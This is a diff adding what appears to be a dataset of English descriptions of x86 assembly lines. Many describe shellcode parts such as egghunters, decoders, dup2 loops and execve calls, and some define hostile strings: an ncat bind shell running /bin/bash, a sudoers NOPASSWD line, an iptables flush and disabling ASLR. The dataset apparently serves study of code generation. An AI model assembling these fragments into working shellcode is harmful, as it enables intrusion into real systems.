@@ -1,0 +1,3105 @@
+define the _appendfile label
+define the _build label
+define the _child label
+define the _close label
+define the _cmd label
+define the _continue label
+define the _dup2_loop label
+define the _exec label
+define the _execline label
+define the _exit label
+define ip equal to 0x0100007f
+define the _isegg label
+define the _load_data label
+define the _next label
+define the _params label
+define the _parent_read label
+define the _parent label
+define the _random label
+define the _return label
+define the _setsockopt label
+define the _shell label
+define the _socket label
+define the _start label
+define the _user label
+define the _while_loop label
+define the _write label
+define the numeric label 1
+define the label 1
+define the label 2
+define the numeric label 2
+define the label 3
+define the numeric label 3
+allocate one byte of memory for a_letter variable and initialize it to 'd'
+add esi into memory address ebp-4
+add the contents of the bh register into the ah register
+add 0x25 to the al register
+add 0x3 to the contents in al and save the result in al
+add 0x33 to the contents in al and save the result in al
+add 0x66 to the contents in al and save the result in al
+add 0xa to the al register
+add 0xb to the al register
+add byte '0' to al
+add the byte in edi to the al register
+add memory[di + 20] to ax
+add 01 to ax
+add 0x2 to the contents in bl and save the result in bl
+add ax to bx
+add 0x4 from the byte at the address edi and negate the result
+add the byte at the address edi after subtracting the value 7
+add the value 8 from the byte in edi and negate it
+add 0x1 from the current byte of the shellcode and negate the result
+add 0x1 from the byte at the address esi and negate the result
+add the value 0x9 from the current byte of the shellcode and then negate the result
+negate the byte at the address esi after adding the value 2
+add the value 3 from the byte in esi and negate it
+add 10 to the single byte stored at memory address var
+add 20 to the single byte stored at memory address var
+add an immediate operand 65 to byte_value
+add the register dl in the memory location byte_value
+add 0x2 to the contents in cl and save the result in cl
+add 0xb8 to the cl register
+add the value 0x1b into the dx register
+add 0x2f2f to the contents in dx and save the result in dx
+add the contents of the local variable stored at ebp-4 into eax
+add 0x10 to eax
+add 0x12345678 to the contents in eax and save the result in eax
+add 0x2d383638 to the contents in eax and save the result in eax
+add 0x31179798 to the contents in eax and save the result in eax
+add 0x5 to edx and jump to L2 if the result is not 0
+add the value 0x7 to eax and jump to the label L4 if the sum is not zero
+add 1 to ebx and jump to L1 if the result is not zero
+add 10 to eax
+add 10 to the contents of eax
+add 16 to eax
+add 2 to the contents of the eax register
+add 2 to the eax register
+add decimal 2 to eax register
+add 24 to eax
+add 4 to eax
+add 40000h to eax register
+add 48 to eax
+add the value 9 to eax and jump to decode if the result is not zero
+add c to eax
+add ebx to eax
+add ebx to eax and store the result in eax
+add edx to eax
+add the contents of edx to the contents of eax
+add the contents of the edx register to the contents of eax register
+add the contents of esi to the contents of eax
+add the contents of the esi register to the contents of eax register
+add 0x2 to the contents of ebp
+add 16 to ebx
+add decimal integer 2 to ebx
+add 2 to the contents of the ebx register
+add 48 to ebx
+add 3 to the contents of the ebx register
+add decimal integer 5 to ebx
+add ecx to ebx
+add 16 to ecx
+add ebx to ecx
+add the contents of edi to the contents of edi
+add the contents of the edi register to the contents of edi register
+set edx to next 16 byte block
+add 32 to edx
+add 48 to edx
+add 64 to the contents of the edx register
+add the contents of eax to the contents of edx
+add the contents of the eax register to the contents of edx register
+add the contents of the eax register to the edx register
+add ecx to edx
+add 0x21354523 to the contents in esi and save the result in esi
+add 0x21354523 to the contents of esi
+add 0x30 to esi
+add 0x33333333 value to esi
+add 0x3f3f3f3f to the contents in esi and save the result in esi
+add 4 to esi
+add the contents of the eax register to the contents of esi register
+add eax to esi
+add 0x20 to the contents in esp and save the result in esp
+add 3 to the contents of esp
+add 3 to the contents of the esp register
+add 4 to the esp register
+add 10 to the variable marks
+define the byte addr and initialize it to 0x1
+define the all label
+define the doubleword an_integer and initialize it to 12425
+perform a logical and operation between the al register and the 0fh value and store the result in the al register
+perform logical and between ax and 1
+mask out lowest 4 bits of the eax register
+clear all but the last 4 bits of eax
+perform and operation between eax and 3f465456 and save the result in eax
+perform and operation between eax and 40392b29 and save the result in eax
+mask out lowest 4 bits of the ebx register
+mask out lowest 4 bits of the ecx register
+mask out lowest 4 bits of the edx register
+perform and operation on the variable mask1 and 128
+define the doubleword arr and initialize it to 100
+define the doubleword arr and initialize it to 50
+reserve the array arr1 of 400 uninitialized bytes
+define the doubleword arr and initialize it to 20
+define an array of 20 initialized word
+define an array of 5 initialized word
+create variable b in memory and initialize to zero
+define the doubleword variable big_number and initialize it to 123456789
+reserve 1 word at location bignum
+reserve 64 bytes for buffer
+declare buffersize to be a word containing 1024
+define a tables of bytes byte_table and initialize to 14, 15 and 22
+define the byte value byte_value and initialize it to 150
+define the byte value bytes and initialize it to 10
+define the byte value bytes and initialize it to 20
+call the _appendfile function
+call the _build function
+call _continue
+call the _continue function
+call the _exec function
+call _exit
+call _malloc
+call the _params function
+call the _printf function
+call the _write function
+call the function in esp
+call the atoi function
+call the code function
+call the doit function
+call the egghunter function
+call esi
+call the function in esi
+call esp
+call the execute function
+call function internetreadfile
+call the iprint function
+call the iprintlf function
+call jmp_search
+call the jmp_search function
+call the loader function
+call the main function
+call the me function
+call my_subroutine
+call the near function
+call the one function
+call the prepare function
+call the quit function
+call the set_argv function
+call the shell_ret function
+call the shellcode function
+call the sprint function
+call the sprintlf function
+call the start function
+call the strlen function
+call the two function
+call the write function
+call the writestring function
+define the call_decoded label
+define the call_decoder label
+define the call_egghunter label
+declare the call_shellcode label
+define the call_shellcode label
+define the callit label
+define the callme label
+define the callpop function
+define the callpop label
+clear the edx register
+extend the sign bit of the eax register into the edx register
+extend the sign bit of eax register into the edx register
+extend the sign bit of eax into the edx register
+define check_even_odd function
+define the child label
+define chmod_call equal to 15
+define variable choice of 1 byte and initialize to y
+set the direction flag to zero
+direction flag equal to zero
+clear the direction flag
+define close_syscall equal to 6
+define the closefile function
+define the closefile label
+define the cmd label
+declare cmd string and initialize it to 'cat /etc/passwd'
+define cmd as the byte string 'cat /etc/passwd'
+compare the contents stored at ebp+arg_0 with 1
+compare if the contents at memory location ebp+var_a is 0
+compare the contents at memory location ebp+var_a with 0
+jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero
+if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5
+compare the contents at memory location esi and the contents of the edx register
+compare the contents at memory location esi with edx
+jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack
+if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
+jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register
+if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register
+compare if the contents of al with 0xf2
+compare the contents of the al register and 0xf2
+compare the contents of the al register with the value 0xf2
+jump to the _start label if the contents of the al register is equal to the value 0xf2
+if the contents of the al register is equal to the value 0xf2 then jump to the _start label
+jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
+if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
+jump to the fillOnes label if the contents of the al register is equal to the value 0xf2
+if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label
+jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register
+if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register
+jump to the label next_page if the contents of the al register is equal to the value 0xf2
+if the contents of the al register is equal to the value 0xf2 then jump to the label next_page
+jump to the _start label if the contents of the al register is equal to the value 0xf2
+if the contents of the al register is equal to the value 0xf2 then jump to the _start label
+if the contents of the al register is equal to the value 0xf2 then jump to the incpage label
+jump to the incpage label if the contents of the al register is equal to the value 0xf2
+jump to the label l1 if the contents of the al register is greater than the decimal value 9
+if the contents of the al register is greater than the decimal value 9 then jump to the label l1
+jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
+if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1
+jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register
+if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register
+jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register
+if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2
+compare the contents of al with the cl register
+compare the contents of the al register and the contents of the cl register
+jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label
+if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label
+if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label
+jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label
+compare the contents of bh and the contents of al
+compare the contents of bl and 0x1f
+jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register
+if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register
+jump to the shellcode label if the contents of the bl register is equal to the value 0xaa
+jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label
+compare ebx register's lower half value against ascii value 48
+compare ebx register's lower half value against ascii value 57
+jump to the memory location loc_402B1D if the contents of the bl register is greater than the value 78h
+if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D
+jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h
+if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D
+jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h
+if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D
+jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h
+if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D
+jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register
+if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label
+jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label
+if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label
+compare the byte at the memory location buff with 61h
+compare the byte at the memory location buff with 7ah
+compare the byte pointed to by eax at this address against zero
+compare the byte at the memory location ebp+ecx with 61h
+compare the byte at the memory location ebp+ecx with 7ah
+jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e
+if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label
+jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label
+if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label
+compare the byte in esi with 0x7
+jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7
+if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label
+if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register
+jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register
+jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7
+compare the byte at the address esi and 0xd
+jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD
+if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label
+jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register
+if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register
+jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD
+jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register
+if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject
+jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label
+if the byte representation of 2 is equal to the contents of the al register else jump to the while label then jump to the label do_inject
+if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1
+jump to the memory address 0xff if the unsigned contents of the cl register is lower than the unsigned value 0x11 else add the 0x5 value to the dl register
+if the unsigned contents of the cl register is lower than the unsigned value 0x11 then jump to the memory address 0xff else add the 0x5 value to the dl register
+jump to the loop label if the contents of the cl register is not equal to the value 0x3
+if the contents of the cl register is not equal to the value 0x3 then jump to the loop label
+jump to the loop2 label if the contents of the cl register is not equal to the value 0x3
+if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label
+jump to the label l2 if the contents of the cl register is greater than the decimal value 12
+if the contents of the cl register is greater than the decimal value 12 then jump to the label l2
+jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12
+if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2
+jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register
+if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3
+jump to the EncodedShellcode label if the contents of the cl register is equal to the contents of the dl register
+if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label
+jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register
+if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register
+jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
+if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label
+compare the contents of the dl register and 1h
+if the contents of the dl register is greater than the decimal value 27 then jump to the label l3
+jump to the label l3 if the contents of the dl register is greater than the decimal value 27
+jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27
+if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3
+jump to the label l1 if the unsigned contents of the dl register is lower than the unsigned contents of the cl register else move the value 0x39 to the al register
+if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register
+compare the dword at the address [eax-4] and egg1
+jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register
+if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register
+jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register
+if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register
+compare the dword at the memory location [eax-4] with the value of egg1
+compare the dword at the address [eax-8] and egg
+jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address
+if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label
+compare the dword at the memory location [eax-8] with the value of egg
+jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register
+if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register
+compare the dword at the address [eax] and the contents of the ebx register
+jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register
+if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register
+jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
+if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
+jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
+jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
+if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register
+if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register
+jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270
+compare the doubleword stored at memory location var to the integer value 10
+compare the dx value with zero
+jump to the L1 label if the contents of the dx register is equal to the value 0x03e8
+if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label
+compare eax to zero
+compare if eax is equal to 0
+compare if eax is zero
+compare the contents of eax and the contents of eax
+jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register
+if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8
+jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register
+if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register
+jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register
+if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B
+compare eax with ebx
+compare the contents of eax and the contents of ebx
+compare the contents of the eax register and the contents of the ebx register
+jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register
+if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47
+if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register
+jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register
+jump to the all label if the contents of the eax register is equal to the contents of the ebx register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the all label
+jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register
+jump to the child label if the contents of the eax register is equal to the contents of the ebx register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the child label
+jump to the connect label if the contents of the eax register is equal to the contents of the ebx register else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the download label
+jump to the download label if the contents of the eax register is equal to the contents of the ebx register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label
+jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
+jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register
+jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register
+jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register
+if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label
+jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register
+if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label
+jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register
+if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label
+jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register
+if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register
+compare the contents of eax with ebx
+compare the contents of the ebp register with the value 0
+compare if ebx is zero
+jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label
+if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label
+compare ecx to 0
+compare if ecx is zero
+compare ecx with 0h
+compare if ecx is equal to 10
+compare if ecx is equal to 100
+compare if our counter is equal to 100
+compare ecx with 5
+compare ecx and ebp
+compare the contents of the ecx register with the contents of the ebp register
+jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register
+if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else
+compare if edi is equal to 0
+compare if edx is zero
+jump to the loop label if the unsigned contents of the edx register is greater than the unsigned value 0x43 else push the contents of the edx register onto the stack
+if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack
+compare whether the edx register has reached 10
+compare the contents of edx to 42
+jump to loc_402B13 if the contents of the edx register is equal to 42
+if the contents of the edx register is equal to 42 then jump to loc_402B13
+compare the contents of edx and the contents of ebx
+jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register
+if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8
+jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
+if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register
+compare if esi is equal to 10
+jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register
+compare the word at the address ecx and 0x5951
+define the code label
+define connect function
+define the cont label
+define a string db and initialize to 'hello world!'
+declare the createfile label
+define createfile function
+declare the cycle label
+declare D1 and move the current byte of the shellcode in the cl register
+declare D1 and move the current byte of the shellcode in the dl register
+in D1 save the shellcode in esi and move it to edi
+define the function D2 and negate the byte in esi
+declare the function D2 and negate the current byte of the shellcode
+define D2 save the in esi the pointer to the shellcode and move esi into edi
+declare the ruotine D3 and add the value 5 to the current byte of the shellcode
+declare the function D3, store the shellcode in edi and move the pointer into esi
+define the function D4 and perform the xor operation between the byte in esi and the 0x1 value
+define the function D4 and perform the xor operation between the byte of the shellcode and the 0x12 value
+declare the data label
+define the byte string ',ajm,pk#########'
+define a byte string and initialize it to '/bin/sh'
+define the byte string '/bin/sh'
+define the byte string '/bin/sh#sh#'
+define the byte string '/etc/passwd#'
+define the byte string '/proc/sys/kernel/randomize_va_spacex'
+define the byte string '/sbin/insmod#/tmp/o.o'
+define the byte string '/sbin/ipchains#-f#'
+define the byte string '/sbin/iptables#-f#'
+define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
+define the byte string '0',10
+define the byte string 'all all=(all) nopasswd: all'
+define the byte string 'cp /bin/sh /tmp/sh'
+initialize a string to 'egg mark'
+define the byte string 'egg mark'
+define the byte string 'my.txtx'
+define the byte string 'rm -f /tmp/f'
+define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
+declare a byte contining 0x68
+declare a byte with no label containing the value 0x68
+declare a byte and initialize it to 0x80
+declare an unlabeled byte initialized to 0x80
+define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
+define a byte and initialize it to 0xcd
+define the byte 0xcd
+declare a byte with no label containing the value 10
+declare an unlabeled byte initialized to 10
+define a byte and initialize it to 0xdeadbeef
+decrement the bl register and jump to L1 if the result is not zero
+decrement the byte at the address dl by one
+decrement the byte in dl
+decrement the cl register by one
+decrement the contents of cl
+decrement the contents of the cl register
+decrement the contents of the cl register and jump to the dup2 label if the result is not negative
+decrement the contents of the cl register and jump to the loopinghere label if the result is not negative
+decrement cl and jump to L2 if the result is not equal to zero
+decrement cl and jump to L2 if the result is zero
+decrement the dl register by one
+decrement the contents of the eax register
+subtract one from the contents of eax
+decrement the eax register by one
+decrement eax
+decrease ebp
+subtract one from the contents of ebx
+decrement the ebx register by one
+decrement ecx by 1
+decrement the contents of the ecx register
+decrement the ecx register by one
+decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative
+decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative
+decrement the contents of the ecx register and jump to the dup2 label if the result is not negative
+decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative
+decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0
+decrement the contents of the ecx register and jump to the duploop label if the result is not negative
+decrement the contents of the ecx register and jump to the loop label if the result is not negative
+decrement the contents of the ecx register and jump to the loop2 label if the result is not negative
+decrement the contents of the ecx register and jump to the counter_is_now_zero label if the result is zero
+decrement the edx register by one
+decrement edx
+decrement the esp register by one
+define decode label
+declare the decoder function
+define decoder function
+declare the decoder label
+declare a constant size and set equal to 25
+define dim to be 512 bytes large
+divide the contents of eax by the word value stored at memory location value
+divide the contents of in eax by by the word value stored at memory location var
+divide eax by ebx
+divide the contents of eax by the contents of ebx
+divide eax by ecx the result of the division is stored in eax and the remainder in edx
+divide eax by value in edx
+divide eax by esi
+declare the do_dup label
+define do_dup label
+declare the doit label
+declare the done label
+declare the download label
+define download function
+declare the dup2 label
+define dup2 function
+delcare the dup2loop label
+declare the duploop label
+define duploop function
+define egg equal to 'egg '
+define egg1 equal to 'mark'
+declare the egghunter label
+declare the end label
+declare the entrypoint label
+define even_number function
+declare the execfile label
+define exit_call equal to 1
+declare the exit_on_error label
+define exit function
+define the exit label
+declare the exit label
+define F2 and call the function function_2
+in the function F2 jump to label L1 if the current byte of the shellcode is greater than 0x2 else add 0x2 to the byte of the shellcode and jump to L2
+declare F2 and point to the next byte in esi
+declare F2 and point to the next word in esi
+define F2 function and jump to L3
+in the function F2 negate bl and move bl to the next byte
+declare F2, negate bl and move bl to the next byte
+declare F2, negate bl and point to the next byte in bl
+in F2 point to the next byte of the eax register and jump to label L2
+define F3 and call the function function_3
+in the routine F3 jump to label L1 if the current byte of the shellcode is equal to 0x3 else move 0x3 into the byte in esi and jump to L2
+declare F3 function and point to the next byte in edi
+declare F3 function and point to the next word in edi
+define F3 and jump to L5
+in the function F3 negate al and move al to the next byte
+define the function F3, negate al and move al to the next byte
+define the function F3, negate al and point to the next byte in al
+define the function F3, move to the next byte of ebx and jump short to L2
+define F4 and call the function function_4
+in the function F4 jump to label L1 if the byte specified by the address in esi is lower than 0x1 else subtract 0x1 from the byte at the address in esi and jump to L2
+declare F4 and jump short to F5
+in the function F4 negate dl and point to the next byte in the dl register
+declare the function F4, negate dl and move dl to the next byte
+declare F4, move to the next byte in ecx and jump to L2
+define F5 and call the function function_5
+in the function F5 jump to label L1 if the byte at the address in esi is greater than 0x2 else add 0x2 to the byte at the address in esi and jump to L2
+declare F5 and jump to L1
+define the function F5, increment edx and jump short to L3
+in the routine F6 jump to label L1 if the byte at the address specified by esi is equal to 0x3 else move 0x3 into the byte in esi and jump to L2
+define file as the byte string '/sbin/iptables#-f'
+declare the fileaddress label
+reserve filecontents variable of 128 bytes
+create a string filename and initialize to 'readme.txt'
+reserve a variable filename of 255 bytes
+declare the fill label
+define fill label
+declare the find_egg label
+define find_egg function
+declare the format label
+declare the formatting label
+define function_1 and execute it
+declare function_2 and execute it
+declare function_3 and call it
+define function_4 and call it
+define function_5 and execute it
+define fupdisasm function
+define fupdisasm label
+declare _shell as global label
+declare of the global _start
+global _start
+define the program entry point
+declare _start as global label
+define google as the byte string '127.1.1.1 google.com'
+define the byte string google and initialize it to '127.1.1.1 google.com'
+declare the gotocall label
+create a string 'hello world!' plus a linefeed character
+define hellolen equal to the length of the hello string
+declare the here label
+define here label
+increment the count variable
+increment the contents of the al register
+add 1 to ax
+increment ax
+increment the contents of the ax register
+increment the contents of the bl register
+increment bx
+increment the contents of the bx register
+increment the byte at the address [esp+ecx] by one
+increment the contents of the cl register
+increment the memory variable count
+increment dl
+increment dl register
+increment the contents of the dl register
+add one to the doubleword integer stored at memory location tmp
+add one to the doubleword integer stored at memory location value
+add one to the doubleword integer stored at location var
+increment the contents of the eax register
+point to the next double word in eax
+move to the next double word in the eax register
+increment ebx register
+increment the contents of the ebx register
+increment ebx
+point to the next byte in the ebx register
+point to the next word in the ebx register
+move to the next word in the ebx register
+point to the next double word in ebx
+move to the next double word in the ebx register
+increment the contents of the ecx register
+increment ecx
+move to the next word in the ecx
+point to the next double word in ecx
+move to the next double word in the ecx register
+increment edi register
+increment the contents of the edx register
+next word in the edx
+increment the contents of the esi register
+next word of the shellcode
+move to the next word of the encoded shellcode
+move to the next word of the shellcode
+point to the next byte of the shellcode and jump to label L2
+move to the next byte in the shellcode and jump short to L2
+increment the contents of the esp register
+declare the incaddr label
+declare incpage function
+declare the init label
+execute the reboot syscall
+make the system call
+system call interrupt
+system call interrupt 0x80
+execute execve with system call interrupt
+execute exit syscall
+make the kernel call
+make the system call to the kernel
+call kernel
+execute execve syscall
+call sys_read
+call sys_read to fill the buffer
+call sys_write
+call the kernel
+make kernel call to display line string
+make kernel call to exit program
+make sys_exit kernel call
+make sys_write kernel call
+make syscall to output the text to stdout
+make syscall to terminate the program
+make the syscall to terminate the program
+make the system calls to the kernel
+jump to exi if greater
+jump to the exit label if the destination operand is greater than the source operand in the above comparison
+jump to next label if the destination is greater than the source in the above comparison
+jump to write if greater
+perform an unsigned comparison and jump to 0xf3 if lower
+jump to label modtest if below
+jump to label next if below
+jump to label write if below
+jump to label done if below or equal
+jump to the all label if the operands of the above comparison are equals
+jump to connect if equal
+jump to the connect label if the operands of the above comparison are equals
+if equal jump to label continue
+jump to label continue if equal
+jump to label done if equal
+jump to even_numer if greater
+jump to label exit if equal to 0
+jump to the exit label if the operands of the above comparison are equals
+if equal then jump to label l7
+jump short to encodedshellcode if equal
+jump to loc_402b13 if equal
+jump to label stop if equal
+jump to the code location labeled loop if the operands of the previous comparison are equal
+jump if greater than to label finished
+jump to the _while_loop if lower
+jump to the _while_loop label if the destination operand is less than the source operand in the above comparison
+jump if less than to label finished
+jump to the wrap_around label if the destination operand is less than the source operand in the above comparison
+if it is less than or equal to 10 then jump to lp1
+jump to label _accept
+jump to _read
+jump to the _return label
+jump to _star
+jump to the _start label
+jump to the _while_loop label
+jump to the aslr_file label
+jump to the instruction labeled begin
+jump to the call_egghunter label
+jump to callpop
+jump to the callpop label
+jump to the callz label
+jump to the carryon label
+jump to connec
+jump to eax
+jump to the value stored in the eax register
+jump to ecx
+jump to edi
+jump to the edi label
+jump to edx
+jump to the encrypt label
+jump to the entrypoint label
+jump to the esp label
+jump to fupdisasm+1
+jump to the address specified by the operation fupdisasm+1
+jump to the address specified by the operation fupdisasm+3
+jump to the jocker label
+jump to label l20
+jump to the label loop
+jump to label multiplyloop
+jump to nextarg label
+jump to the point in the code labeled nextchar
+jump to the one label
+jump to the read label
+jump to the label read
+jump to label read
+jump to the reading label
+jump to the shell label
+jump to shellcode
+jump to the shellcode label
+jump short to the _cmd label
+jump short to the _execline label
+jump short to the _file label
+jump short to the _load_data label
+jump short to _load_data label
